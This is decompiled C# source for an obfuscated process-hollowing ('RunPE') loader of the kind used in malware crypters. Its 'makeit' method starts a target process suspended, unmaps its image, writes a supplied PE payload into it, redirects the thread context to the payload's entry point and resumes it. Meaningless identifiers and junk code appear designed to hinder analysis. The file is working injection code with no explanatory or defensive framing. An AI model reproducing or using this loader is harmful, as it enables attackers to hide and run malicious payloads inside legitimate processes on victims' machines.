using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace dgfgfgfgf;

public class dd
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	internal class VkPYqlnKCNVkKlNJT
	{
		public struct RLRuPoCnpYptZaRar
		{
			public uint TAEkgJFsXVlnopQJQ;

			public uint lcIHvquEPSIRFGNan;

			public uint hCKdUtIiFedaUsSrO;

			public uint DMaoUFunlXNuCIldR;

			public uint wkcNpHIUbihGRuquo;

			public uint SttZpQuZLcRavJNhs;

			public uint OUuvOTIGBnmjOvSAS;

			public hdOJNcvLigWGsLlkV hdOJNcvLigWGsLlkV;

			public uint dEQfjfJpYrqPKAqEt;

			public uint wNgrjnvuIlajpNMnw;

			public uint sliPHqJavwvsHCRHX;

			public uint OvCbHCvgepfPlOlqa;

			public uint JVDAdFJMUECYEDqKA;

			public uint dfULcOwREujsiQMtD;

			public uint SbIQZpsVEYeTPIjCX;

			public uint YGWhBQKvrIHEAFRNb;

			public uint rPmtBZwDbCoYfRkwe;

			public uint nvHmAkvGnMRFlVibp;

			public uint nnoRWcKhRNLhuGpQF;

			public uint JwHdWlwmBGsDbTMDI;

			public uint FXJCsoLToRPMqIRUf;

			public uint YgaNrAAYXLAgYUkGi;

			public uint UHbjQCLFNWUpnJpXJ;

			public uint nQsvQLAKuPEMVWLJM;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
			public byte[] jouTmOLnkbYVkLQak;
		}

		public struct hdOJNcvLigWGsLlkV
		{
			public uint FBNflXAsUUJpRYkMn;

			public uint BYPEKaMZKfdBgNpdN;

			public uint UigPJiBerZNVOZLPR;

			public uint PJhlflMLhkhedOQgo;

			public uint jSBAfuBQRdSBLbjTr;

			public uint eqDVEAMuGomKaQojS;

			public uint ACThDJBCniWeHcLWV;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
			public byte[] taVGZLNgdtqnWRQnt;

			public uint PjmRZUClNmbKEejZw;
		}

		public struct FFVqcQIPgOcFKHnmL
		{
			public uint mgQTmjEYbMcfvmQDL;

			public uint suBkiCuwTvDQvQKSK;
		}

		public struct gsjekDCZOduZWbqeU
		{
			public byte LKnnuXNRDBvTTToqW;

			public FFVqcQIPgOcFKHnmL FFVqcQIPgOcFKHnmL;

			public uint mgQTmjEYbMcfvmQDL;

			public uint suBkiCuwTvDQvQKSK;

			public uint KeUUHNuiqCItsSiVk;

			public uint eUHCugCXkrfmAfKcZ;

			public uint arJXTjNDaFCvQUPtA;

			public uint tEZjSsCIKwjSuhjfD;

			public uint pcbIouOmAKHbMWowb;

			public uint TAEkgJFsXVlnopQJQ;
		}

		public struct vdEOIOCLlhBESdRhv
		{
			public IntPtr wRoFahGQUeuwitPQU;

			public IntPtr ErngEesjeTZnSHLwt;

			public int Q42vgs40UwKlHv9bAZAFIwqTU;

			public int HMtpMJOYWOLHJXPCE;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct NNXweaDuLmFhPfpkZ
		{
			public int aVNEMSDdGIsbnkimHsf;

			public string aVNEMSDdGIsbnkimH;

			public string VtOZiVOKtTQkFZnGf;

			public string pFflhdEPdMAHkmKpi;

			public int kdhKGgPtTYUQCbPJJ;

			public int nVDJHEIdJJYZNFOjh;

			public int GnAVGpEBDREkhnisM;

			public int CNCrbsPeqcZtwcnMj;

			public int VXTGbEEjZWJQdpJvn;

			public int RvUbAGPQPhdZseOPN;

			public int kHlnwPFVwaNtaqiCQ;

			public int TAEkgJFsXVlnopQJQ;

			public short gfnMVSQCmliFpfnSo;

			public short CoGXVbFHWfSYXsJFr;

			public int vPItqeQlMqmhmhOWS;

			public int RYZIqnFqtjWETthIV;

			public int NwadPpQXjvrNiimZs;

			public int gJrpOBGcSobhQvJLv;
		}

		public struct bupgCmDgirKNMgRnC
		{
			public int bgtOkERIICvqfkNcW;

			public IntPtr vqMZkNGOptfNMAhOZ;

			public int ikmIuVDUYhFIrcNAP;
		}

		public struct sfWRsasafaseSFHGR
		{
			public ushort hhWVFVFeuapTlroMq;

			public ushort ls6r2uu3r3s45ssFhre262;

			public ushort AUHpTgEGvlJloemDp;

			public ushort tsJOojPjlAeuGTqUQ;

			public ushort suBkiCuwTvDQvQKSK;

			public ushort PFZaosEpVqORkfNHT;

			public ushort LcbwNvPVLEiaCUSXr;

			public ushort nQsvQLAKuPEMVWLJM;

			public ushort emsKMHEarvSuhhlKu;

			public ushort aMtgiJQHhJnGwWqbU;

			public ushort tWNriSFMRCXZdiNNX;

			public ushort ouPQGVQqHOrjtXRev;

			public ushort LGfcGeFvoHbFaklQB;

			public ushort GehBchQceSwOpZqhZ;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
			public ushort[] aVNEMSDdGIsbnkimH;

			public ushort ZnAMbqGhOLgiXlMTc;

			public ushort VOCiAsROEXDrmaRkC;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
			public ushort[] CoGXVbFHWfSYXsJFr;

			public int mgQTmjEYbMcfvmQDL;
		}

		public struct qIOuRgqrlBIWgALjl
		{
			public uint mKUwgSrBHPVKWFjtT;

			public oXTtAEGTkQkOTnlXG KDQoNeHINAPRUCPcd;

			public kvVSVHRwabIXicpnd hLaBvEsHaciwMKKFB;
		}

		public struct oXTtAEGTkQkOTnlXG
		{
			public ushort GIleVQGFKVprQoMag;

			public ushort dNgDNntNuqwlCOiPg;

			public uint CfnDrTRiAgMDfdRrH;

			public uint LGfcGeFvoHbFaklQB;

			public uint VpGOqbHnhZtXNqkdK;

			public ushort suBkiCuwTvDQvQKSK;

			public ushort TAEkgJFsXVlnopQJQ;
		}

		public struct kvVSVHRwabIXicpnd
		{
			public ushort hhWVFVFeuapTlroMq;

			public byte RQIkPeSUXlRgcfpui;

			public byte kZZvPnHZHeBDJsMgl;

			public uint gAaUlqSGupVMYhQAL;

			public uint CJrgkCHLeiFgGtkjO;

			public uint uhtFJESpTuZpVipDm;

			public uint mgQTmjEYbMcfvmQDL;

			public uint QqMQJNIuDnKLDvLmp;

			public uint krdcVRBTsPgkgXSUm;

			public uint djcXUHGlQoGIbwPWY;

			public uint MROmeQTaqBeVSkQGQ;

			public uint fbfAeZIgasOowwkqT;

			public ushort bBgWDcTMQGiAOloKq;

			public ushort uLAiClIRAwTUtBLtt;

			public ushort qjCHYnTvnLndLnQNU;

			public ushort MsSSYwJDXEXApCjwX;

			public ushort ITUotCUhMPrJIooQv;

			public ushort bckCtLJmtIcdmELCB;

			public uint XDmYSOUTjUwmEqPTY;

			public uint wssiTQtqAhncILjIc;

			public uint sTuHpSHXnsKlYAnZC;

			public uint aMtgiJQHhJnGwWqbU;

			public ushort qMGkRWJYTNgJjGjFc;

			public ushort TAEkgJFsXVlnopQJQ;

			public uint lkIJnZUFJYDSBsoWC;

			public uint IuYUniKKqSlmfHKJF;

			public uint DUaqLlVngdIvvtPad;

			public uint WeqELuKsQWpScJjMg;

			public uint SFsahwVZGiMbrvndH;

			public uint lOMmgIKembtuZKKPK;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
			public hmNLFLWLcmRHowPgh[] hmNLFLWLcmRHowPgh;
		}

		public struct hmNLFLWLcmRHowPgh
		{
			public uint mgQTmjEYbMcfvmQDL;

			public uint suBkiCuwTvDQvQKSK;
		}

		[DebuggerNonUserCode]
		public VkPYqlnKCNVkKlNJT()
		{
		}

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool CreateProcess([MarshalAs(UnmanagedType.VBByRefStr)] ref string name, [MarshalAs(UnmanagedType.VBByRefStr)] ref string command, ref bupgCmDgirKNMgRnC process, ref bupgCmDgirKNMgRnC thread, bool inherit, uint flags, IntPtr system, [MarshalAs(UnmanagedType.VBByRefStr)] ref string current, [In] ref NNXweaDuLmFhPfpkZ startup, out vdEOIOCLlhBESdRhv info);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool WriteProcessMemory(IntPtr process, IntPtr address, byte[] buffer, IntPtr size, out int written);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int ReadProcessMemory(IntPtr process, IntPtr address, ref IntPtr buffer, IntPtr size, ref int read);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int VirtualProtectEx(IntPtr process, IntPtr address, UIntPtr size, UIntPtr @new, [Out] uint old);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr VirtualAllocEx(IntPtr process, IntPtr address, uint size, uint type, uint protect);

		[DllImport("ntdll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern long ZwUnmapViewOfSection(IntPtr process, IntPtr address);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern uint ResumeThread(IntPtr thread);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool GetThreadContext(IntPtr thread, ref RLRuPoCnpYptZaRar context);

		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool SetThreadContext(IntPtr thread, ref RLRuPoCnpYptZaRar context);
	}

	public const long IiBS5cN7BCYM9OQHhDeI = 512L;

	public const long fk55NllMqxTAsl8f0SJhv = 64L;

	public const long G7CwFnHbIr5efkW5WNhc = 128L;

	public const long H004jPr126743T361ohRSuVwN = 32L;

	public const long rM7scAMxhDvCNX6siaqS = 16L;

	public const long RBIsXyPmiePg8Qyxqv3R = 8L;

	public const long P7ALSEMSkues4e9YvFIv = 1L;

	public const long mVvQPJxb7ivFTRJBIWUQ = 4L;

	public const uint Z2ulNotAqqAlJtZ8eyOo = 2u;

	[DebuggerNonUserCode]
	public dd()
	{
	}

	public static void makeit(byte[] krdcVRBTsPgkgXSUm, string GDuoVanYcIQHNjlGp)
	{
		VkPYqlnKCNVkKlNJT.RLRuPoCnpYptZaRar context = default(VkPYqlnKCNVkKlNJT.RLRuPoCnpYptZaRar);
		VkPYqlnKCNVkKlNJT.vdEOIOCLlhBESdRhv info = default(VkPYqlnKCNVkKlNJT.vdEOIOCLlhBESdRhv);
		VkPYqlnKCNVkKlNJT.NNXweaDuLmFhPfpkZ startup = default(VkPYqlnKCNVkKlNJT.NNXweaDuLmFhPfpkZ);
		VkPYqlnKCNVkKlNJT.bupgCmDgirKNMgRnC process = default(VkPYqlnKCNVkKlNJT.bupgCmDgirKNMgRnC);
		VkPYqlnKCNVkKlNJT.bupgCmDgirKNMgRnC thread = default(VkPYqlnKCNVkKlNJT.bupgCmDgirKNMgRnC);
		GCHandle gCHandle = GCHandle.Alloc(krdcVRBTsPgkgXSUm, GCHandleType.Pinned);
		int num = gCHandle.AddrOfPinnedObject().ToInt32();
		object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), default(VkPYqlnKCNVkKlNJT.sfWRsasafaseSFHGR).GetType());
		VkPYqlnKCNVkKlNJT.sfWRsasafaseSFHGR sfWRsasafaseSFHGR = default(VkPYqlnKCNVkKlNJT.sfWRsasafaseSFHGR);
		VkPYqlnKCNVkKlNJT.sfWRsasafaseSFHGR sfWRsasafaseSFHGR2 = ((obj != null) ? ((VkPYqlnKCNVkKlNJT.sfWRsasafaseSFHGR)obj) : sfWRsasafaseSFHGR);
		gCHandle.Free();
		string name = null;
		string current = null;
		IntPtr system = default(IntPtr);
		if (0 - (VkPYqlnKCNVkKlNJT.CreateProcess(ref name, ref GDuoVanYcIQHNjlGp, ref process, ref thread, inherit: false, 4u, system, ref current, ref startup, out info) ? 1 : 0) == 0)
		{
			return;
		}
		VkPYqlnKCNVkKlNJT.qIOuRgqrlBIWgALjl qIOuRgqrlBIWgALjl = default(VkPYqlnKCNVkKlNJT.qIOuRgqrlBIWgALjl);
		IntPtr ptr = new IntPtr(checked(num + sfWRsasafaseSFHGR2.mgQTmjEYbMcfvmQDL));
		object? obj2 = Marshal.PtrToStructure(ptr, qIOuRgqrlBIWgALjl.GetType());
		VkPYqlnKCNVkKlNJT.qIOuRgqrlBIWgALjl qIOuRgqrlBIWgALjl2 = default(VkPYqlnKCNVkKlNJT.qIOuRgqrlBIWgALjl);
		qIOuRgqrlBIWgALjl = ((obj2 != null) ? ((VkPYqlnKCNVkKlNJT.qIOuRgqrlBIWgALjl)obj2) : qIOuRgqrlBIWgALjl2);
		startup.NwadPpQXjvrNiimZs = Strings.Len((object)startup);
		context.TAEkgJFsXVlnopQJQ = 65538u;
		if (((long)qIOuRgqrlBIWgALjl.mKUwgSrBHPVKWFjtT != 17744L) | (sfWRsasafaseSFHGR2.hhWVFVFeuapTlroMq != 23117))
		{
			return;
		}
		bool threadContext = VkPYqlnKCNVkKlNJT.GetThreadContext(info.ErngEesjeTZnSHLwt, ref context);
		IntPtr wRoFahGQUeuwitPQU = info.wRoFahGQUeuwitPQU;
		checked
		{
			IntPtr address = (IntPtr)(unchecked((long)context.SbIQZpsVEYeTPIjCX) + 8L);
			long num2 = default(long);
			ptr = (IntPtr)num2;
			IntPtr size = (IntPtr)4;
			int read = 0;
			int num3 = VkPYqlnKCNVkKlNJT.ReadProcessMemory(wRoFahGQUeuwitPQU, address, ref ptr, size, ref read);
			num2 = (long)ptr;
			if (!(unchecked(threadContext && num3 >= 0) & (VkPYqlnKCNVkKlNJT.ZwUnmapViewOfSection(info.wRoFahGQUeuwitPQU, (IntPtr)num2) >= 0L)))
			{
				return;
			}
			uint num4 = (uint)(int)VkPYqlnKCNVkKlNJT.VirtualAllocEx(info.wRoFahGQUeuwitPQU, (IntPtr)qIOuRgqrlBIWgALjl.hLaBvEsHaciwMKKFB.djcXUHGlQoGIbwPWY, qIOuRgqrlBIWgALjl.hLaBvEsHaciwMKKFB.wssiTQtqAhncILjIc, 12288u, 4u);
			if (unchecked((long)num4) == 0L)
			{
				return;
			}
			IntPtr wRoFahGQUeuwitPQU2 = info.wRoFahGQUeuwitPQU;
			IntPtr address2 = (IntPtr)num4;
			IntPtr size2 = (IntPtr)qIOuRgqrlBIWgALjl.hLaBvEsHaciwMKKFB.sTuHpSHXnsKlYAnZC;
			uint num5 = default(uint);
			read = (int)num5;
			VkPYqlnKCNVkKlNJT.WriteProcessMemory(wRoFahGQUeuwitPQU2, address2, krdcVRBTsPgkgXSUm, size2, out read);
			num5 = (uint)read;
			long num6 = sfWRsasafaseSFHGR2.mgQTmjEYbMcfvmQDL + 248;
			int num7 = unchecked((int)qIOuRgqrlBIWgALjl.KDQoNeHINAPRUCPcd.dNgDNntNuqwlCOiPg) - 1;
			VkPYqlnKCNVkKlNJT.gsjekDCZOduZWbqeU gsjekDCZOduZWbqeU = default(VkPYqlnKCNVkKlNJT.gsjekDCZOduZWbqeU);
			VkPYqlnKCNVkKlNJT.gsjekDCZOduZWbqeU gsjekDCZOduZWbqeU2 = default(VkPYqlnKCNVkKlNJT.gsjekDCZOduZWbqeU);
			for (int i = 0; i <= num7; i++)
			{
				ptr = new IntPtr(num + num6 + i * 40);
				object? obj3 = Marshal.PtrToStructure(ptr, gsjekDCZOduZWbqeU.GetType());
				gsjekDCZOduZWbqeU = ((obj3 != null) ? ((VkPYqlnKCNVkKlNJT.gsjekDCZOduZWbqeU)obj3) : gsjekDCZOduZWbqeU2);
				byte[] array = new byte[(int)gsjekDCZOduZWbqeU.suBkiCuwTvDQvQKSK + 1];
				int num8 = (int)(unchecked((long)gsjekDCZOduZWbqeU.suBkiCuwTvDQvQKSK) - 1L);
				for (int j = 0; j <= num8; j++)
				{
					array[j] = krdcVRBTsPgkgXSUm[(int)(unchecked((long)gsjekDCZOduZWbqeU.KeUUHNuiqCItsSiVk) + unchecked((long)j))];
				}
				IntPtr wRoFahGQUeuwitPQU3 = info.wRoFahGQUeuwitPQU;
				IntPtr address3 = (IntPtr)(num4 + gsjekDCZOduZWbqeU.mgQTmjEYbMcfvmQDL);
				IntPtr size3 = (IntPtr)gsjekDCZOduZWbqeU.suBkiCuwTvDQvQKSK;
				read = (int)num5;
				VkPYqlnKCNVkKlNJT.WriteProcessMemory(wRoFahGQUeuwitPQU3, address3, array, size3, out read);
				num5 = (uint)read;
				VkPYqlnKCNVkKlNJT.VirtualProtectEx(info.wRoFahGQUeuwitPQU, (IntPtr)(num4 + gsjekDCZOduZWbqeU.mgQTmjEYbMcfvmQDL), (UIntPtr)gsjekDCZOduZWbqeU.FFVqcQIPgOcFKHnmL.suBkiCuwTvDQvQKSK, (UIntPtr)(ulong)YOmFcZuUQHMZpTJYO(gsjekDCZOduZWbqeU.TAEkgJFsXVlnopQJQ), (uint)num2);
			}
			byte[] bytes = BitConverter.GetBytes(num4);
			IntPtr wRoFahGQUeuwitPQU4 = info.wRoFahGQUeuwitPQU;
			IntPtr address4 = (IntPtr)(unchecked((long)context.SbIQZpsVEYeTPIjCX) + 8L);
			IntPtr size4 = (IntPtr)4;
			read = (int)num5;
			VkPYqlnKCNVkKlNJT.WriteProcessMemory(wRoFahGQUeuwitPQU4, address4, bytes, size4, out read);
			num5 = (uint)read;
			context.nvHmAkvGnMRFlVibp = num4 + qIOuRgqrlBIWgALjl.hLaBvEsHaciwMKKFB.mgQTmjEYbMcfvmQDL;
			VkPYqlnKCNVkKlNJT.SetThreadContext(info.ErngEesjeTZnSHLwt, ref context);
			VkPYqlnKCNVkKlNJT.ResumeThread(info.ErngEesjeTZnSHLwt);
		}
	}

	private static long jWJLWnJjdXlODKmsP(long BGbsrCJVCbprALOwq, long FgaWWwvpMQViiWJfS)
	{
		return checked((long)Math.Round(UQsHrLvajVaOfYhit(BGbsrCJVCbprALOwq) / Math.Pow(2.0, FgaWWwvpMQViiWJfS)));
	}

	private static double UQsHrLvajVaOfYhit(long QoudQNKHZguXuNmCU)
	{
		if (QoudQNKHZguXuNmCU < 0L)
		{
			return (double)QoudQNKHZguXuNmCU + 4294967296.0;
		}
		return QoudQNKHZguXuNmCU;
	}

	private static long YOmFcZuUQHMZpTJYO(long XrnXaetTpOEmJFmXM)
	{
		object[] array = new object[8] { 1L, 16L, 2u, 32L, 4L, 64L, 4L, 4L };
		return Conversions.ToLong(array[checked((int)jWJLWnJjdXlODKmsP(XrnXaetTpOEmJFmXM, 29L))]);
	}

	public void Class1_Vdz21qQf57N6l()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			new decimal(1599796930L);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}
}
